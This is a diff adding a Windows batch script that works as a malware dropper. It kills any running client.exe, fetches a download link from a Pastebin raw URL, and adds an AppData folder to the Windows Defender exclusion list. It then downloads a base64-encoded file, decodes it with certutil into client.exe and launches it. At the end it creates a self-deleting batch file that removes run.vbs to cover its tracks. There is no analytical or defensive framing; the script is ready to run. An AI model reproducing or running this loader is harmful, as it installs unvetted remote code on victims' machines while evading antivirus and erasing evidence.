@@ -1,0 +1,107 @@
+@echo off
+
+:: Check for admin privileges
+net session >nul 2>&1
+if %errorLevel% neq 0 (
+    echo This script requires administrative privileges.
+    echo Please run this script as an administrator.
+    pause
+    exit /b
+)
+
+:: Check if client.exe is running and kill it if it is
+tasklist | find /i "client.exe" >nul
+if %errorlevel% equ 0 (
+    echo client.exe is running. Terminating it...
+    taskkill /f /im client.exe
+) else (
+    echo client.exe is not running.
+)
+
+:: Set the URL of your Pastebin link
+set "pastebinUrl=https://pastebin.com/raw/0BaiMJBr"
+
+:: Fetch the download link from Pastebin
+echo Fetching download link from Pastebin...
+for /f "usebackq tokens=*" %%i in (`powershell -Command "(Invoke-WebRequest -Uri '%pastebinUrl%').Content"`) do (
+    set "downloadUrl=%%i"
+)
+
+:: Check if downloadUrl was set
+if not defined downloadUrl (
+    echo Failed to retrieve the download link from Pastebin.
+    pause
+    exit /b
+)
+
+:: Display the download URL
+echo Download link retrieved: %downloadUrl%
+
+:: Get the path of the current script
+set "scriptDir=%~dp0"
+
+:: Check and delete encoded.txt if it exists
+if exist "%scriptDir%\encoded.txt" (
+    del "%scriptDir%\encoded.txt"
+    echo File deleted.
+) else (
+    echo File does not exist.
+)
+
+:: Check if folder exists, if not, create it
+set "folder=%APPDATA%\SubDir"
+if not exist "%folder%" (
+    mkdir "%folder%"
+    echo Folder created: %folder%
+) else (
+    echo Folder already exists: %folder%
+)
+
+:: Add folder to Windows Defender exclusion list
+powershell -Command "Add-MpPreference -ExclusionPath '%folder%'"
+echo Folder added to Windows Defender exclusion list.
+
+:: Download the data using the fetched URL
+set "downloadedFile=%scriptDir%encoded.txt"
+echo Downloading data from: %downloadUrl%
+powershell -Command "(New-Object Net.WebClient).DownloadFile('%downloadUrl%', '%downloadedFile%')"
+
+if exist "%downloadedFile%" (
+    echo Data downloaded and saved to: %downloadedFile%
+) else (
+    echo Failed to download data.
+    pause
+    exit /b
+)
+
+set "checkFile=%folder%\client.exe"
+if exist "%checkFile%" (
+    del "%checkFile%"
+) else (
+    echo Failed to delete file.
+)
+
+:: Decode the file and save it to SubDir
+set "extractedFile=%folder%\client.exe"
+certutil -decode "%downloadedFile%" "%extractedFile%"
+if exist "%extractedFile%" (
+    echo File decoded and saved to: %extractedFile%
+    start "" "%extractedFile%"
+) else (
+    echo Failed to decode the file.
+)
+
+if exist "%scriptDir%\encoded.txt" (
+    del "%scriptDir%\encoded.txt"
+    echo File deleted.
+) else (
+    echo File does not exist.
+)
+
+:: Create a temporary batch file to delete the original script and run.vbs
+echo @echo off > "%scriptDir%\delete.bat"
+echo del "%scriptDir%\run.vbs" >> "%scriptDir%\delete.bat"
+echo del "%scriptDir%\delete.bat" >> "%scriptDir%\delete.bat"
+
+:: Execute the temporary batch file
+start "" "%scriptDir%\delete.bat"
